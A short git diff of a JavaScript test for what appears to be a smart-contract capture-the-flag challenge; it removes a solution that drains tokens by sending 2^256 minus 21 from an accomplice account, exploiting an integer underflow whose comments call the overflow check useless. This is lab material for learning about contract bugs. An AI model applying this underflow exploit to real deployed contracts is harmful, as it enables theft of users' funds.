@@ -21,13 +21,6 @@ before(async () => {
 });
 
 it("solves the challenge", async function () {
-  const eoaAddress = await eoa.getAddress();
-  // contract uses unsigned integer which is always >= 0, overflow check is useless
-  tx = await challenge
-    .connect(accomplice)
-    // we start with 20 tokens, make sure eoa's balance doesn't overflow as well
-    .transfer(eoaAddress, BigNumber.from(`2`).pow(256).sub(`21`));
-  await tx.wait();
 });
 
 after(async () => {
